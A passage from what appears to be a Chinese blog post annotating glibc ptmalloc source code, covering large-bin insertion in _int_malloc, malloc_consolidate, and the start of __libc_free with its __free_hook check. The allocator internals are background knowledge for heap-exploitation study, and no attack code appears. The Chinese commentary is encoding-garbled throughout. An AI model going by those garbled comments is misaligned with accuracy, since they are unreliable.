&amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br><br>          <span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123;<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">         If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">         sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">       */</span><br><br>      <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>        &#123;<br>          bin = bin_at (av, idx);<br><br>          <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>          <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>            &#123;<br>              victim = victim-&gt;bk_nextsize;<br>              <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                      (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>                victim = victim-&gt;bk_nextsize;<br><br>              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                 list does not have to be rerouted.  */</span><br>              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>                victim = victim-&gt;fd;<br><br>              remainder_size = size - nb;<br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a><code>malloc_consolidate</code></h3><ol><li>é¦–å…ˆåˆ¤æ–­å½“å‰ malloc_state ç»“æ„ä½“ä¸­çš„ fastbin æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºå°±è¯´æ˜æ•´ä¸ª malloc_state éƒ½æ²¡æœ‰å®Œæˆåˆå§‹åŒ–ï¼Œéœ€è¦å¯¹malloc_state è¿›è¡Œåˆå§‹åŒ–ã€‚</li><li>malloc_state çš„åˆå§‹åŒ–æ“ä½œç”±å‡½æ•° malloc_init_state(av) å®Œæˆï¼Œè¯¥å‡½æ•°å…ˆåˆå§‹åŒ–é™¤ fastbins ä¹‹å¤–çš„æ‰€æœ‰çš„binsï¼Œå†åˆå§‹åŒ– fastbinsï¼Œæ¸…ç©º fastbins</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_consolidate</span><span class="hljs-params">(mstate av)</span><br>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-type">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>  <span class="hljs-keyword">if</span> (get_max_fast () != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//global_max_fastä¸ä¸º0ï¼Œè¡¨ç¤ºptmallocå·²ç»åˆå§‹åŒ–ï¼Œæ¸…é™¤åˆ†é…åŒºflagä¸­fastbinçš„æ ‡å¿—ä½</span><br><br><span class="hljs-comment">/*#define clear_fastchunks(M) \</span><br><span class="hljs-comment">  catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)*/</span><br><span class="hljs-comment">//#define FASTCHUNKS_BIT        (1U)</span><br><span class="hljs-comment">//catomic_oræ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œç”¨äºå¯¹åœ°å€ä¸Šçš„å€¼è¿›è¡ŒæŒ‰ä½æˆ–è¿ç®—</span><br><span class="hljs-comment">//ç»“æœflagsè¢«ç½®ä¸º1</span><br>    clear_fastchunks(av);<br><br><span class="hljs-comment">//unsorted_chunks(M) (bin_at (M, 1))</span><br><br><span class="hljs-comment">/*#define bin_at(m, i) \  </span><br><span class="hljs-comment">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))         \  </span><br><span class="hljs-comment">             - offsetof (struct malloc_chunk, fd))*/</span><br><span class="hljs-comment">//æ¯ä¸ªbinå ç”¨ä¸¤ä¸ªæŒ‡é’ˆï¼Œæ‰€ä»¥ä¹˜ä»¥2</span><br><span class="hljs-comment">//è·å–arenaå¯¹åº”çš„unsortedbinçš„ç¬¬ä¸€ä¸ªç¬¬ä¸€ä¸ªbin</span><br><br>    unsorted_bin = unsorted_chunks(av);<br><br><span class="hljs-comment">//#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">//maxfbæ˜¯æŒ‡å‘fastbinä¸­æœ€åä¸€ä¸ªbinçš„æŒ‡é’ˆ</span><br>    maxfb = &amp;fastbin (av, NFASTBINS - <span class="hljs-number">1</span>);<br><span class="hljs-comment">//è·å–ç¬¬ä¸€ä¸ªbinçš„åœ°å€</span><br>    fb = &amp;fastbin (av, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-comment">//è¯»å–fbçš„å½“å‰å€¼</span><br>    <span class="hljs-comment">//å°†fbè®¾ç½®ä¸º0</span><br>    <span class="hljs-comment">//è¿”å›ä¹‹å‰çš„é“¾è¡¨å¤´åœ°å€</span><br>      p = atomic_exchange_acq (fb, <span class="hljs-number">0</span>);<br><br><br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-comment">//å¦‚æœprev_inuseä¸º0åˆ™æŠ¥é”™</span><br>  check_inuse_chunk(av, p);<br>  <span class="hljs-comment">//å°†nextpèµ‹å€¼ä¸ºä¸‹ä¸€ä¸ªbin</span><br>  nextp = p-&gt;fd;<br>  <span class="hljs-comment">//PREV_INUSEä¸º0x1ï¼ŒNON_MAIN_ARENAä¸º0x4</span><br>  <span class="hljs-comment">//é€šè¿‡æŒ‰ä½ä¸å»é™¤PREV_INUSEä½å’ŒNON_MAIN_ARENAä½</span><br>  size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);<br><br><span class="hljs-comment">//#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span><br><span class="hljs-comment">//é€šè¿‡å½“å‰chunkçš„åœ°å€å’Œå¤§å°è®¡ç®—å‡ºä¸‹ä¸€ä¸ªchunkçš„åœ°å€</span><br>  nextchunk = chunk_at_offset(p, size);<br><span class="hljs-comment">//#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span><br><span class="hljs-comment">//#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span><br><span class="hljs-comment">//è·å–nextchunkçš„å®é™…å†…å­˜å¤§å°</span><br>  nextsize = chunksize(nextchunk);<br><br><span class="hljs-comment">//prev_inuse(p) ((p)-&gt;size &amp; PREV_INUSE)ï¼Œç¡®è®¤å†…å­˜å—æ˜¯å¦ç©ºé—²</span><br><br><span class="hljs-comment">//å¦‚æœpæŒ‡å‘çš„chunkç©ºé—²ï¼Œå³prev_inuseä¸º0</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br><br>    prevsize = p-&gt;prev_size;<span class="hljs-comment">//è·å–å‰ä¸€ä¸ªchunkçš„å¤§å°</span><br>    size += prevsize;  <span class="hljs-comment">//æ›´æ–°å½“å‰chunkçš„å¤§å°ï¼Œå¢åŠ å‰ä¸€ä¸ªchunkçš„å¤§å°</span><br>    p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<span class="hljs-comment">//è·å–ä¸Šä¸€ä¸ªchunkçš„åœ°å€ï¼Œç„¶åèµ‹å€¼ç»™p</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">#define unlink(AV, P, BK, FD) &#123;                                            \  </span><br><span class="hljs-comment">    FD = P-&gt;fd;              \  </span><br><span class="hljs-comment">    BK = P-&gt;bk;              \  </span><br><span class="hljs-comment">    //FDä¸ºè¦ç§»é™¤å—çš„fdæŒ‡é’ˆï¼ŒBKä¸ºè¦ç§»é™¤å—çš„bkæŒ‡é’ˆ</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">__builtin_expectæ˜¯GCCæä¾›çš„ä¸€ä¸ªä¼˜åŒ–æç¤ºï¼Œå‘Šè¯‰ç¼–è¯‘å™¨åœ¨å¸¸è§æƒ…å†µä¸‹é“¾è¡¨æ˜¯æ­£ç¡®çš„ï¼Œè€Œä¸å¸¸è§çš„æƒ…å†µä¸‹é“¾è¡¨ä¼šæŸå®³</span><br><span class="hljs-comment">FDçš„bkæŒ‡é’ˆå¦‚æœä¸ç­‰äºå½“å‰å—æˆ–BKçš„fdæŒ‡é’ˆä¸ç­‰äºå½“å‰å—åˆ™é“¾è¡¨æŸå®³</span><br><span class="hljs-comment">é€šè¿‡malloc_printerrè¾“å‡ºé”™è¯¯ä¿¡æ¯</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))        \  </span><br><span class="hljs-comment">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">å¦‚æœé“¾è¡¨æ²¡æœ‰æŸå®³ï¼Œç»§ç»­æ‰§è¡Œç§»é™¤æ“ä½œ</span><br><span class="hljs-comment">    else &#123;               \  </span><br><span class="hljs-comment">    å°†FDçš„å‰å‘æŒ‡é’ˆæŒ‡å‘BKï¼Œç„¶åå°†BKçš„åå‘æŒ‡å‘æŒ‡å‘FD</span><br><span class="hljs-comment">        FD-&gt;bk = BK;              \  </span><br><span class="hljs-comment">        BK-&gt;fd = FD;              \  </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//åˆ¤æ–­å½“å‰å—pçš„å¤§å°æ˜¯å¦åœ¨å°å—å †çš„èŒƒå›´å†…ã€‚</span><br><span class="hljs-comment">        if (!in_smallbin_range (P-&gt;size)           \  </span><br><span class="hljs-comment">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;         \  </span><br><span class="hljs-comment">        //ä¼˜åŒ–æŒ‡ä»¤ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨è¿™ä¸ªæ¡ä»¶å¾ˆå°‘å‘ç”Ÿ</span><br><span class="hljs-comment">        //æ£€æŸ¥æ£€æŸ¥å½“å‰å—åœ¨åŒå‘é“¾è¡¨ä¸­æ˜¯å¦å®Œæ•´</span><br><span class="hljs-comment">      if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)       \  </span><br><span class="hljs-comment">   || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \  </span><br><span class="hljs-comment">        malloc_printerr (check_action,          \  </span><br><span class="hljs-comment">           &quot;corrupted double-linked list (not small)&quot;,    \  </span><br><span class="hljs-comment">           P, AV);           \ </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">åˆ¤æ–­FDçš„fd_nextsizeæ˜¯å¦ä¸ºç©ºï¼Œè¡¨ç¤ºFDæ˜¯å¦æ˜¯å½“å‰é“¾è¡¨çš„å°¾éƒ¨</span><br><span class="hljs-comment">            if (FD-&gt;fd_nextsize == NULL) &#123;           \  </span><br><span class="hljs-comment">        å¦‚æœæ˜¯å°¾éƒ¨ï¼Œè€Œä¸”Pçš„fd_nextsizeåˆ¤å®šä¸ºPï¼Œåˆ™å°†FDä½œä¸ºé“¾è¡¨çš„å”¯ä¸€å…ƒç´ </span><br><span class="hljs-comment">                if (P-&gt;fd_nextsize == P)           \  </span><br><span class="hljs-comment">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;        \  </span><br><span class="hljs-comment">                else &#123;              \  </span><br><span class="hljs-comment">                ç¡®ä¿åŒå‘é“¾æ¥çš„å®Œæ•´æ€§</span><br><span class="hljs-comment">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;         \  </span><br><span class="hljs-comment">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;         \  </span><br><span class="hljs-comment">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;         \  </span><br><span class="hljs-comment">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;         \  </span><br><span class="hljs-comment">                  &#125;             \  </span><br><span class="hljs-comment">                  å¦‚æœFD-&gt;nextsizeä¸ä¸ºç©ºï¼Œæ„å‘³ç€FDå·²ç»ä½äºé“¾è¡¨ä¸­ã€‚</span><br><span class="hljs-comment">              åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦æ›´æ–°Pçš„å‰åé“¾æ¥</span><br><span class="hljs-comment">              &#125; else &#123;              \  </span><br><span class="hljs-comment">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;        \  </span><br><span class="hljs-comment">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;        \  </span><br><span class="hljs-comment">              &#125;              \  </span><br><span class="hljs-comment">          &#125;              \  </span><br><span class="hljs-comment">      &#125;               \  </span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//avå³å½“å‰çš„arena</span><br><span class="hljs-comment">//pä¸ºè¦ç§»é™¤çš„å—</span><br>    unlink(av, p, bck, fwd);<span class="hljs-comment">//å°†å‰ä¸€ä¸ªchunkä»é“¾è¡¨ä¸­ç§»é™¤</span><br>  &#125;<br><br><span class="hljs-comment">//å¦‚æœnextchunkå’Œtop chunkä¸ç›¸åŒï¼Œåˆ™è¯´æ˜å½“å‰çš„å†…å­˜å—ä¸æ˜¯å †ä¸­çš„é¡¶ç«¯å—</span><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br><span class="hljs-comment">/*#define inuse_bit_at_offset(p, s)           \  </span><br><span class="hljs-comment">  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size &amp; PREV_INUSE)*/</span><br><span class="hljs-comment">//æ£€æŸ¥nextchunkæ˜¯å¦ä¸ºå·²åˆ†é…ï¼Œå¦‚æœå·²åˆ†é…åˆ™nextinuseä¸º1</span><br>    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br><span class="hljs-comment">//å¦‚æœnextinuseä¸ºæœªåˆ†é…åˆ™æ‰§è¡Œ</span><br>    <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br><span class="hljs-comment">//å°†nextchunkçš„nextsizeè¿½åŠ åˆ°å½“å‰å—pçš„å¤§å°sizeä¸Šï¼Œæ›´æ–°åˆå¹¶åå—çš„å¤§å°</span><br>      size += nextsize;<br>      <span class="hljs-comment">//å°†nextchunkç§»é™¤</span><br>      unlink(av, nextchunk, bck, fwd);<br>    &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">//å¦‚æœnextchunkå·²åˆ†é…ï¼Œåˆ™æ¸…é™¤nextchunkçš„prev_inuseä½</span><br>      clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//å°†unsortedbinçš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆå­˜å…¥first_unsortedä¸­</span><br>    first_unsorted = unsorted_bin-&gt;fd;<br>    <span class="hljs-comment">//å°†å½“å‰å—pæ’å…¥åˆ°unsortedbinçš„å¼€å¤´</span><br>    unsorted_bin-&gt;fd = p;<br>    <span class="hljs-comment">//å°†åŸå…ˆçš„ç¬¬ä¸€ä¸ªæœªæ’åºå—çš„åå‘æŒ‡é’ˆæŒ‡å‘å½“å‰å—pï¼Œå®ŒæˆåŒå‘é“¾è¡¨çš„æ›´æ–°</span><br>    first_unsorted-&gt;bk = p;<br><br>    <span class="hljs-keyword">if</span> (!in_smallbin_range (size)) &#123;<br>      p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>      p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    set_head(p, size | PREV_INUSE);<br>    p-&gt;bk = unsorted_bin;<br>    p-&gt;fd = first_unsorted;<br>    set_foot(p, size);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>  &#125;<br>&#125; <span class="hljs-keyword">while</span> ( (p = nextp) != <span class="hljs-number">0</span>);<br><span class="hljs-comment">//ç›´åˆ°éå†å®Œå½“å‰fastbinä¸­çš„æ‰€æœ‰ç©ºé—²chunk</span><br>      &#125;<br>    &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>    <span class="hljs-comment">//ç›´åˆ°éå†å®Œæ‰€æœ‰çš„fastbin</span><br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//å¦‚æœptmallocæ²¡æœ‰åˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ptmalloc</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">//å¦‚æœå½“å‰çš„freeæ˜¯chunké€šè¿‡mmapåˆ†é…çš„ï¼Œè°ƒç”¨munmap_chunkå‡½æ•°</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>  <span class="hljs-comment">//ä¸éœ€è¦å¯¹åˆ†é…åŒºåŠ 